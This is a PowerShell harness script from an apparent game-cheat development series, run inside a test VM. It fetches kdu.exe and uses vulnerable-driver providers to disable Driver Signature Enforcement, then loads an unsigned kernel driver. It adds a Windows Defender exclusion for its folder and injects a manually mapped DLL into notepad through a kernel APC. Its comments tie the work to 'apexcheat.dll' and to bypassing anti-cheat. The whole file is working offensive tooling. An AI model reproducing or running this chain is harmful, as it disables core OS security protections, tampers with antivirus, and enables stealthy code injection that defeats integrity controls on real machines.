# h281_cur.ps1 - H281 = h280 with ONE variable: the payload is mapped by hand instead of being
# handed to a loader. h280 closed the loader question (LoadLibraryExW on a proven pointer still
# returned 87 twice), so no Ldr path is used any more: the driver reads the file, lays the
# headers and sections out at their RVAs, applies relocations, and the APC entry calls
# DllMain(imageBase, DLL_PROCESS_ATTACH, NULL) and stores its BOOL.
#
# The payload is apxprobe.dll ON PURPOSE: 2 sections, 0x3000 image, NO relocations, NO imports,
# NO TLS, no CRT, DllMain returns TRUE. Everything that could fail for an unrelated reason is
# absent, so this rung measures the copy-and-call machinery alone.
#   VERDICT IS entryResult, NOT the module count - a mapped image is never in the Ldr list, so
#   the module count staying 35 is expected here and is not a failure.
# RCX is compared against MapBase in this rung (map mode hands the image base to the routine),
# not against remoteBase. The path echo is kept because it still proves the read reached the
# target, but the path is no longer the argument.
# The stub bytes are proven on the host first (_ritual/h281_stubtest.ps1) - do the same for any
# future stub change, h278 paid a guest run to learn that.
#
# --- h280 header follows, still true ---
# h279 settled the plumbing: the stub executed (entered=0x4870), RCX arrived holding exactly
# remoteBase, the echo held the full path before and 1 s after - and LoadLibraryW on that pointer
# still returned NULL with LastError 87, the same value the empty-string h275 got. So the string
# and the argument path are proven and the API call itself is what fails.
#
# --- h279 header follows, still true ---
# h278 answered nothing: it came back entered=0x1E05C748, rcx=0x260D8948000048. Those are the
# stub's OWN CODE BYTES (48 C7 05 1E / 48 89 0D 26), not stamps - v6 wrote the absolute data
# offsets (30, 38) as RIP-relative displacements and read back at the stub base. Both stores had
# landed at +41/+56 in the zero-filled page instead of +30/+38. ABI v7 writes 19/20 and reads
# the data slots, layout unchanged.
#
# --- h278 header follows, still true ---
# Driver ABI v6 answers both: the stub's first instruction stamps magic 0x4870, its second
# stores RCX, then it jumps to the real LoadLibraryW. The driver reads both back 1 s later and
# the launcher prints stub=/entered=/rcx=/remoteBase=.
#
# Everything else is h277 unchanged (full path, DSE read-back first, both restore arms).
#
# --- h277 header follows, still true ---
# h276 proved the resolved LoadLibraryW address is right (GetProcAddress on that same kernelbase
# returns exactly the 0xFC5B0 the driver called), proved the remote buffer holds the requested
# string (echo_status=0x0, echo matches, still there 1 s later) and proved the APC fired.
#
# --- h276 header follows, still true ---
# v5 reports what the target BUFFER holds -
# StatusEchoRead + RemotePathEcho (read immediately after the write, must equal the requested
# path) and StatusEchoAfter/RemotePathEchoAfter - plus a second sample 1 s later
# (StatusReadResult2 / LoadLibraryLastError2 / ModuleCountAfter2).
#
# Second fix, not a variable: h275's restore ran `kdu -dse 6` WITHOUT -prv, so kdu fell back to
# NalDrv.sys, which this build refuses with 0xC0000603 (cert revoked). No write happened and the
# guest was left at DSE=0 with no service. Both restore arms now pass -prv $winner and are
# followed by an identical read to prove the value, and the run starts with a read-back of DSE
# so nothing below trusts DSE without dse_pre.
#
# --- h271 header follows, still true ---
# v4 resolves kernel32!LoadLibraryW INSIDE the target (PEB -> Ldr -> kernelbase export table)
# and reports what the call DID instead of reporting that an APC was delivered. Target is
# NOTEPAD on purpose: the NULL-return reproduces there, so EAAC is out of the picture and a
# failure is provably ours. Verdict comes from the module count / echo / LastError, never an
# exit code.
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d    = 'C:\Users\Public\p37'
$tag  = 'h281'
$done = "$d\h281.done"
$L    = New-Object System.Collections.ArrayList
function W([string]$s) { [void]$L.Add(((Get-Date -f 'HH:mm:ss.fff') + ' ' + $s)) }
function Post {
    $body = $L -join "`r`n"
    try { Set-Content -LiteralPath "$d\$tag.out" -Value $body } catch { }
    for ($k = 1; $k -le 3; $k++) {
        try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## $tag`r`n" + $body)); break } catch { Start-Sleep -Milliseconds 400 }
    }
}
md $d -Force | Out-Null
# one completion marker: the tick re-arms every minute and every replay would reload
# the driver and re-cycle DSE. Delete the marker to re-arm deliberately.
if (Test-Path $done) { exit 0 }
$lock = "$d\h276.lock"
$bootId = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime.Ticks
# single-run lock: stamped with this boot, so a lock orphaned by a bugcheck is stale
# immediately after the reboot instead of blocking the chain for its whole window.
if (Test-Path $lock) {
    $old = @(Get-Content $lock -EA 0)
    if ($old.Count -ge 2) {
        $age = [int]((Get-Date) - [datetime]::FromFileTime([long]$old[1])).TotalMinutes
        if ([long]$old[0] -eq $bootId -and $age -lt 12) { exit 0 }
    }
}
Set-Content -LiteralPath $lock -Value ($bootId, (Get-Date).ToFileTime())
if (Test-Path "$d\$tag.out") {
    Copy-Item -LiteralPath "$d\$tag.out" -Destination ("$d\$tag.hist." + (Get-Date -f 'MMdd-HHmmss') + '.out') -Force -EA 0
}
function Done { Remove-Item -LiteralPath $lock -Force -EA 0 }
function RunExe([string]$exe, [string[]]$argv, [int]$capMs = 20000, [int]$maxLines = 20) {
    $q = ''
    foreach ($a in $argv) { if ($a -match '[\s"]') { $q += ' "' + ($a -replace '"', '\"') + '"' } else { $q += ' ' + $a } }
    W ('$ ' + (Split-Path $exe -Leaf) + $q)
    $rc = -999; $out = ''
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe; $psi.Arguments = $q.Trim(); $psi.UseShellExecute = $false
    $psi.WorkingDirectory = $d; $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
    try {
        $p = [System.Diagnostics.Process]::Start($psi)
        $tO = $p.StandardOutput.ReadToEndAsync(); $tE = $p.StandardError.ReadToEndAsync()
        if (-not $p.WaitForExit($capMs)) { W ('  TIMEOUT ' + $capMs + 'ms'); try { $p.Kill() } catch { }; try { [void]$p.WaitForExit(3000) } catch { } }
        else { try { [void]$p.WaitForExit(2000) } catch { } }
        try { $rc = $p.ExitCode } catch { }
        foreach ($t in $tO, $tE) { if ($t.Wait(2500) -and $t.IsCompleted) { try { $out += $t.Result } catch { } } else { W '  (stream did not close)' } }
    } catch { W ('  LAUNCH FAIL ' + $_.Exception.Message) }
    if ($out) { $out = $out -replace "`r`n", "`n" }
    W ('  exit=' + $rc)
    $i = 0
    foreach ($line in ($out -split "`n")) { if ($i -ge $maxLines) { W '  | ...'; break }; if ($line.Trim() -ne '') { W ('  | ' + $line.TrimEnd()) }; $i++ }
    $script:lastOut = $out
    return $rc
}
function Svc([string]$argline, [int]$capMs = 8000) { return RunExe "$env:SystemRoot\system32\sc.exe" ($argline -split ' ') $capMs 8 }
# slice: verbatim, untruncated copies of the lines this run exists for. The modules: line now
# carries lastError2=, both echoes and the three stub fields, so it is copied whole instead of
# through the 32-line cap - the stub numbers must never be truncated away.
function Slice([string]$out) {
    foreach ($line in ($out -split "`n")) {
        if ($line -match 'driver ABI v|targetinfo:|delivery:|modules:|echo=|echo_after=|stub=|entered=|rcx=|remoteBase=|map: base=|entryResult=|\[\+\] Kernel injection|\[-\] delivered|VERDICT') {
            W ('  > ' + $line.Trim())
        }
    }
}
# restore (R4): driver stopped and deleted BEFORE DSE goes back, so a stale object cannot wedge
# the next run; notepad and the Public copy go too. Identical second call = read-back against
# the value step 1 observed. Called from every path that mutated something.
function Restore {
    W 'STEP=restore'
    Svc 'stop zapexdrv' 8000 | Out-Null
    Svc 'delete zapexdrv' 8000 | Out-Null
    Svc 'delete apexdrv' 8000 | Out-Null
    Get-Process notepad -EA 0 | Stop-Process -Force -EA 0
    Remove-Item -LiteralPath "$env:SystemDrive\Users\Public\apexprobe.dll" -Force -EA 0
    if ($winner -lt 0 -or $dseRestore -eq '') {
        W 'dse_verify=SKIP no provider / no dse_pre (DSE untouched this run)'
    } else {
        RunExe $kdu @('-prv', "$winner", '-dse', "$dseRestore") 15000 3 | Out-Null
        W ('dse restore out=[' + (($script:lastOut -replace '\s+', ' ').Trim()) + ']')
        # read-back: a second identical call prints the value it found before writing again.
        RunExe $kdu @('-prv', "$winner", '-dse', "$dseRestore") 15000 3 | Out-Null
        $dseLine = ($script:lastOut -replace '\s+', ' ').Trim()
        $okDse = ($dsePreText -ne '' -and $dseLine -match ('value:\s*' + [regex]::Escape($dsePreText) + '\b'))
        W ('dse_verify=' + $(if ($okDse) { 'PASS' } else { 'FAIL out=[' + $dseLine + ']' }))
    }
    W ('restore: svc=[' + (((& "$env:SystemRoot\system32\sc.exe" query zapexdrv 2>&1) -split "`n" | Where-Object { $_ -match 'STATE|does not exist|FAILED' }) -join ' ') + '] notepad=' + @(Get-Process notepad -EA 0).Count)
}
W 'alive'
W ('bench build ' + (Get-CimInstance Win32_OperatingSystem).BuildNumber + ' boot=' + (Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToString('dd/MM HH:mm') + ' pid=' + $PID)
W ('pre svc: ' + (((& "$env:SystemRoot\system32\sc.exe" query zapexdrv 2>&1) -split "`n" | Where-Object { $_ -match 'STATE|FAILED|does not exist' }) -join ' | ').Trim())
W ('pre minidumps=' + @(Get-ChildItem "$env:SystemRoot\Minidump\*.dmp" -EA 0).Count + ' notepad=' + @(Get-Process notepad -EA 0).Count)
try { Add-MpPreference -ExclusionPath $d -ErrorAction Stop } catch { }
Post

function Fetch([string]$name, [string]$to, [int]$minLen) {
    for ($i = 1; $i -le 3; $i++) {
        try { (New-Object Net.WebClient).DownloadFile("$base/$name", $to) } catch { }
        if ((Test-Path $to) -and ((Get-Item $to).Length -ge $minLen)) { return $true }
        Start-Sleep -Milliseconds 400
    }
    W ('FETCH FAIL ' + $name); return $false
}
$sys = "$d\zapexdrv.sys"; $exe = "$d\apex_launcher.exe"; $dll = "$d\apxprobe.dll"; $zdl = "$d\zapexcheat.dll"; $kdu = "$d\kdu.exe"
$driverAbi = 9
$wantPath  = 'C:\Users\Public\apxprobe.dll'    # the control payload: no relocs/imports/TLS
# ABI v9 image (manual map, 54-byte stub, data slots +54/+62/+70). Pinned to the build that
# passed GATE 0 at 13:39; a v8 image would refuse at the ABI check, so the pin also proves the
# guest is running v9.
$finger = 'E35CD140C4103BD14593E9A1147A94507EE17E8D34029E14B9CE8DC1424DF621'
$pinned = ($finger.Length -eq 64)
$missing = @()
if (-not (Fetch 'kdu.exe' $kdu 400000)) { $missing += 'kdu' }
if (-not (Fetch 'drv64.dll' "$d\drv64.dll" 1000000)) { $missing += 'drv64' }
if (-not (Fetch 'zapexdrv.sys' $sys 4000)) { $missing += 'sys' }
if (-not (Fetch 'apex_launcher.exe' $exe 300000)) { $missing += 'exe' }
if (-not (Fetch 'apxprobe.dll' $dll 1500)) { $missing += 'dll' }
if (-not (Fetch 'zapexcheat.dll' $zdl 200000)) { $missing += 'zdll' }
$h = if (Test-Path $sys) { (Get-FileHash $sys -Algorithm SHA256).Hash } else { 'none' }
W ('sha=' + $h.Substring(0, [Math]::Min(16, $h.Length)) + $(if (-not $pinned) { ' UNPINNED' } elseif ($h -eq $finger) { ' MATCH' } else { ' MISMATCH' }))
if ($missing -or ($pinned -and $h -ne $finger)) { W ('RESULT: FAIL fetch ' + ($missing -join ',')); Post; Done; exit 1 }
W ('launcher sha=' + (Get-FileHash $exe -Algorithm SHA256).Hash.Substring(0, 16) + ' dll=' + (Get-FileHash $dll -Algorithm SHA256).Hash.Substring(0, 16))
Copy-Item -LiteralPath $dll -Destination "$env:SystemDrive\Users\Public\apxprobe.dll" -Force -EA 0
Post

# --- DSE read-back FIRST: h275's restore faulted, so nothing below may ASSUME a DSE state.
# Read-only form (no value argument: kdu loads the provider and prints, writes nothing). Value
# is printed in HEX and -dse parses DECIMAL, so the text is kept for comparison and converted
# only for the write. Providers come from the csv with 22 last (prv 22 = WinRing0, its
# MmMapIoSpace(NULL) path bugchecked twice).
W 'STEP=dse-read'
$dsePreText = ''; $dseRestore = ''; $winner = -1
RunExe $kdu @('-listcsv', "$d\kdu_list.csv") 20000 3 | Out-Null
$ids = @()
foreach ($row in (Get-Content "$d\kdu_list.csv" -EA 0)) {
    if ($row -match '^\s*"?(\d{1,3})') { $ids += [int]$matches[1] }
}
$ids = @($ids | Select-Object -Unique | Where-Object { $_ -ne 22 })
$ids += 22
$readIds = @(22) + @($ids | Where-Object { $_ -ne 22 } | Select-Object -First 3)
foreach ($id in $readIds) {
    RunExe $kdu @('-prv', "$id", '-dse') 20000 4 | Out-Null
    if ($script:lastOut -match 'value:\s*([0-9A-Fa-f]+)') {
        $dsePreText = $matches[1].ToUpper(); $dseRestore = [string]([Convert]::ToInt32($dsePreText, 16))
        W ('  read via prv ' + $id)
        break
    }
    W ('  read prv ' + $id + ' no value: [' + (($script:lastOut -replace '\s+', ' ').Trim()) + ']')
}
W ('dse_pre=' + $(if ($dsePreText -ne '') { '0x' + $dsePreText } else { 'UNREADABLE' }) + ' restore-target=' + $(if ($dseRestore -ne '') { $dseRestore } else { 'none' }) + ' (0 = left as found)')
Post
if ($dsePreText -eq '') {
    W 'RESULT: FAIL - variable: DSE read-back unavailable, state of the guest not trusted'
    W 'VERDICT: FAIL - no provider could read GvCiOptions; nothing mutated, nothing restored'
    Restore; Post; Done; exit 1
}

# kdu: the new image is unsigned, so DSE has to be off.
W 'STEP=dse'
$dseOn = $true
Svc 'delete zapexdrv' 8000 | Out-Null
Svc ('create zapexdrv type= kernel start= demand binPath= ' + $sys) 8000 | Out-Null
foreach ($id in ($ids | Select-Object -First 4)) {
    RunExe $kdu @('-prv', "$id", '-dse', '0') 20000 2 | Out-Null
    Svc 'start zapexdrv' 8000 | Out-Null
    $q = ((& "$env:SystemRoot\system32\sc.exe" query zapexdrv 2>&1) -join ' ')
    if ($q -match 'RUNNING') { $dseOn = $false; $winner = $id; W ('  prv ' + $id + ' -> DSE off, driver RUNNING'); break }
    W ('  prv ' + $id + ' no: ' + (($script:lastOut -replace '\s+', ' ').Trim()))
    Svc 'delete zapexdrv' 8000 | Out-Null
    Svc ('create zapexdrv type= kernel start= demand binPath= ' + $sys) 8000 | Out-Null
}
if ($dseOn) {
    W 'RESULT: FAIL no provider landed DSE=0'
    W ('VERDICT: FAIL - DSE unchanged at 0x' + $dsePreText + ', driver never started')
    Restore; Post; Done; exit 1
}
Post

# --- the probe itself: notepad as the control target -------------------------
W 'STEP=target'
Get-Process notepad -EA 0 | Stop-Process -Force -EA 0
$np = Start-Process notepad -PassThru
Start-Sleep -Seconds 2
$tp = $np.Id
W ('notepad pid=' + $tp + ' threads=' + @(Get-Process -Id $tp -EA 0).Threads.Count)
Post
W 'STEP=probe-kernel'
Svc 'delete zapexdrv' 8000 | Out-Null
Svc 'delete apexdrv' 8000 | Out-Null
# h273 answered the prefix question: BOTH forms (NT-prefixed and plain) fail with 2, so
# ToNtPath is innocent. What was left running is the DSE probe service "zapexdrv" - a
# SECOND instance of the same image. Its DriverEntry does IoCreateDevice(\Device\ApexDrv),
# which collides with the already-loaded instance and the SCM reports the failure as 2.
# So: stop and release the probe service first, then let the launcher own the only
# instance. (The device name is per image, not per service name.)
W 'STEP=release'
Svc 'stop zapexdrv' 8000 | Out-Null
Svc 'delete zapexdrv' 8000 | Out-Null
W ('  zapexdrv after release: [' + (((& "$env:SystemRoot\system32\sc.exe" query zapexdrv 2>&1) -split "`n" | Where-Object { $_ -match 'STATE|does not exist|FAILED' }) -join ' ') + ']')
Post
RunExe $exe @('--probe', '--pid', "$tp", '--driver', $sys) 60000 22 | Out-Null
Post
W 'STEP=inject-kernel'
$rcI = RunExe $exe @('--inject', '--method=kernel', '--pid', "$tp", '--driver', $sys, '--dll', $wantPath, '--manual-map', '--no-sticky') 90000 32
$injOut = $script:lastOut
W 'STEP=slice'
Slice $injOut
Post

# read-back (R3): the process must still be alive, the service state is recorded and
# the payload's own oracle file may only exist if DllMain actually ran.
Start-Sleep -Seconds 2
W ('post notepad alive=' + [bool](Get-Process -Id $tp -EA 0) + ' inject rc=' + $rcI)
W ('post svc: ' + (((& "$env:SystemRoot\system32\sc.exe" query zapexdrv 2>&1) -split "`n" | Where-Object { $_ -match 'STATE|FAILED' }) -join ' | ').Trim())
$hits = 0
foreach ($g in @("$env:SystemDrive\Users\*\AppData\Local\QwenKern", "$env:SystemDrive\Windows\Temp\QwenKern", "$env:SystemDrive\Windows\System32\config\systemprofile\AppData\Local\QwenKern")) {
    foreach ($dir in (Get-ChildItem -Path $g -Directory -EA 0)) {
        foreach ($f in (Get-ChildItem -Path $dir.FullName -Filter ('*' + $tp + '*') -EA 0)) { W ('  ORACLE ' + $f.FullName); $hits++ }
    }
}
W ('oracle hits=' + $hits)

# verdict (R3): in MAP mode the verdict is MapEntryResult, NOT the module count - a mapped image
# is never in the Ldr list, so a flat 35/35/35 here is EXPECTED and is not a failure. What has to
# hold instead: an image base was written (MapBase != 0), the APC fired, the map stub executed
# (entered=0x4870), RCX arrived as that base, and DllMain returned TRUE through the stub. RCX is
# compared against MapBase in this rung (h279 compared it against remoteBase). MapStatus is only
# quoted when the map itself failed.
$abi = -1; $fired = -1; $echoStatus = -1; $echo = ''; $echoAfter = ''
$mBefore = -1; $mAfter = -1; $mAfter2 = -1; $le1 = -1; $le2 = -1
$stubBase = [uint64]0; $entered = -1; $stubRcx = [uint64]0; $remoteBase = [uint64]0; $exUsed = -1
$mapBase = [uint64]0; $mapResult = [uint64]0; $mapStatus = -1; $mapRelocs = -1; $mapImports = -1; $mapTls = -1
$magic = 0x4870
foreach ($line in ($injOut -split "`n")) {
    if ($line -match 'driver ABI v(\d+)') { $abi = [int]$matches[1] }
    if ($line -match 'delivery:') {
        if ($line -match 'fired=(\d)') { $fired = [int]$matches[1] }
        if ($line -match 'lastError=(\d+)') { $le1 = [int]$matches[1] }
        if ($line -match '\bex=(\d)') { $exUsed = [int]$matches[1] }
    }
    # the echo and stub fields ride on the modules: line (v5/v6 print them after lastError2=)
    if ($line -match 'modules: before=(\d+) after=(\d+) after2=(\d+)') {
        $mBefore = [int]$matches[1]; $mAfter = [int]$matches[2]; $mAfter2 = [int]$matches[3]
    }
    if ($line -match 'echo_status=0x([0-9A-Fa-f]+)') { $echoStatus = [Convert]::ToInt64($matches[1], 16) }
    if ($line -match 'echo=\[([^\]]*)\]') { $echo = $matches[1] }
    if ($line -match 'echo_after=\[([^\]]*)\]') { $echoAfter = $matches[1] }
    if ($line -match 'lastError2=(\d+)') { $le2 = [int]$matches[1] }
    if ($line -match '\bstub=0x([0-9A-Fa-f]+)') { $stubBase = [Convert]::ToUInt64($matches[1], 16) }
    if ($line -match '\bentered=0x([0-9A-Fa-f]+)') { $entered = [Convert]::ToInt64($matches[1], 16) }
    if ($line -match '\brcx=0x([0-9A-Fa-f]+)') { $stubRcx = [Convert]::ToUInt64($matches[1], 16) }
    if ($line -match '\bremoteBase=0x([0-9A-Fa-f]+)') { $remoteBase = [Convert]::ToUInt64($matches[1], 16) }
    # the map: line carries the whole map verdict
    if ($line -match 'map: base=0x([0-9A-Fa-f]+)') { $mapBase = [Convert]::ToUInt64($matches[1], 16) }
    if ($line -match 'status=0x([0-9A-Fa-f]+)') { $mapStatus = [Convert]::ToInt64($matches[1], 16) }
    if ($line -match 'entryResult=0x([0-9A-Fa-f]+)') { $mapResult = [Convert]::ToUInt64($matches[1], 16) }
    if ($line -match 'relocs=(\d+)') { $mapRelocs = [int]$matches[1] }
    if ($line -match 'imports=(\d+)') { $mapImports = [int]$matches[1] }
    if ($line -match 'tls=(\d+)') { $mapTls = [int]$matches[1] }
}
$echoOk = ($echo.Trim() -ieq $wantPath)
W ('parsed: abi=' + $abi + ' echo_ok=' + [int]$echoOk + ' echo_status=' + $echoStatus + ' echo_len=' + $echo.Length + ' echo_after=[' + $echoAfter + '] fired=' + $fired + ' modules=' + $mBefore + '/' + $mAfter + '/' + $mAfter2 + ' (flat is fine here)')
W ('stub: base=0x' + $stubBase.ToString('X') + ' entered=' + $(if ($entered -lt 0) { 'unparsed' } else { '0x' + $entered.ToString('X') }) + ' rcx=0x' + $stubRcx.ToString('X'))
W ('map: base=0x' + $mapBase.ToString('X') + ' status=' + $mapStatus + ' entryResult=0x' + $mapResult.ToString('X') + ' relocs=' + $mapRelocs + ' imports=' + $mapImports + ' tls=' + $mapTls)
$loaded = ($mBefore -ge 0 -and (($mAfter -gt $mBefore) -or ($mAfter2 -gt $mBefore)))
$rcxOk  = ($mapBase -ne 0 -and $stubRcx -eq $mapBase)
# unsigned subtraction throws on a negative result in 5.1, so the sign is decided first
$delta   = if ($mapBase -eq 0) { 'n/a' } elseif ($stubRcx -ge $mapBase) { '0x' + ($stubRcx - $mapBase).ToString('X') } else { '-0x' + ($mapBase - $stubRcx).ToString('X') }

if ($abi -lt 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - no driver ABI handshake in the launcher output'
    $why = 'FAIL - launcher died before delivery (service/device), not the loader'
} elseif ($abi -lt $driverAbi) {
    $verdict = 'FAIL'
    $res = 'FAIL - driver ABI v' + $abi + ' < v' + $driverAbi + ', launcher refused before delivery'
    $why = 'FAIL - stale driver image, rebuild and reload apexdrv.sys'
} elseif ((-not $echoOk) -or $echoStatus -ne 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - path not in target (echo_status=' + $echoStatus + ' echo=' + $echo.Length + ')'
    $why = 'FAIL - copy/alloc, not the loader (echo=[' + $echo + '] after=[' + $echoAfter + '])'
} elseif ($fired -eq 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - path landed, APC never fired'
    $why = 'FAIL - thread choice, tid never returned alertable'
} elseif ($entered -lt 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - path landed, fired, but no entered= field in the output'
    $why = 'FAIL - launcher/driver ABI mix-up, stub fields missing (abi=' + $abi + ')'
} elseif ($stubBase -eq 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - path landed, fired, but no stub page (stub=0x0)'
    $why = 'FAIL - stub alloc/write failed inside the driver; unknown=unmeasured'
} elseif ($entered -eq 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - stub queued and fired=1, but entered=0'
    $why = 'FAIL - NO user-mode code ran: the APC routine did not execute (delivery/thread, not the mapper)'
} elseif ($entered -ne $magic) {
    $verdict = 'FAIL'
    $res = 'FAIL - widened map stub layout regressed: stamp 0x' + $entered.ToString('X') + ' (want 0x4870)'
    $why = 'FAIL - conclude NOTHING about the mapper from this run; hex-dump the stub page 0x' + $stubBase.ToString('X') + ' (0..78), rcx=0x' + $stubRcx.ToString('X')
} elseif ($mapBase -eq 0) {
    # the map branch never produced an image, so nothing could be mapped or called
    $verdict = 'FAIL'
    $res = 'FAIL - map did not produce an image base (mapBase=0x0, MapStatus=' + $mapStatus + ')'
    $why = 'FAIL - driver-side map failure at MapStatus ' + $mapStatus + ' (1 open, 2 size/read, 3 header, 4 alloc, 5 reloc, 6 section write); the APC path is not implicated'
} elseif (-not $rcxOk) {
    $verdict = 'FAIL'
    $res = 'FAIL - stub entered, but rcx=0x' + $stubRcx.ToString('X') + ' != mapBase=0x' + $mapBase.ToString('X')
    $why = 'FAIL - OUR argument plumbing: RCX did not receive the mapped base (delta=' + $delta + ')'
} elseif ($mapResult -ne 0) {
    $verdict = 'FAIL'
    $res = 'FAIL - image mapped at 0x' + $mapBase.ToString('X') + ' but DllMain returned FALSE (entryResult=0x' + $mapResult.ToString('X') + ')'
    $why = 'FAIL - the mapping itself worked; the control payload rejected its own init (see the .dll log)'
} else {
    # base written, stub ran on the right argument, DllMain returned TRUE. Nothing else is needed:
    # the image is deliberately absent from the Ldr list.
    $verdict = 'PASS'
    $res = 'PASS - manual map: image at 0x' + $mapBase.ToString('X') + ', DllMain returned TRUE through the map stub'
    $why = 'MAP PASS - kernel-side PE map (relocs=' + $mapRelocs + ' imports=' + $mapRelocs + ' tls=' + $mapTls + '), APC + stub layout intact, entry executed and returned TRUE; no LoadLibrary involved'
}
if ($hits -gt 0) {
    if ($verdict -ne 'PASS') { $res = 'PASS - DllMain ran (oracle file)' }
    $verdict = 'PASS'; $why += ' (oracle file = DllMain ran)'
}
W ('RESULT: ' + $res)
W ('VERDICT: ' + $why)
Post

Restore
W ('dse_pre=' + '0x' + $dsePreText + ' dse_verify must be PASS for the guest to be trusted')
W ('RESULT: ' + $verdict + ' - variable: v9 manual map in place of the loader call. The driver maps ' + $wantPath + ' itself (kernel ZwCreateFile/ZwReadFile, header check, pool image, DIRECT64 relocation pass, one write) and the 54-byte map stub calls DllMain(base,1,NULL) with the BOOL read back into MapEntryResult; ex= and lastError= are now informational only. Control payload = apxprobe.dll (no relocs, no imports, no TLS) into notepad (winner prv ' + $winner + '); this PASS says nothing about apexcheat.dll, which brings imports, TLS and Guard CF')
Post
Set-Content -LiteralPath $done -Value $verdict
Done
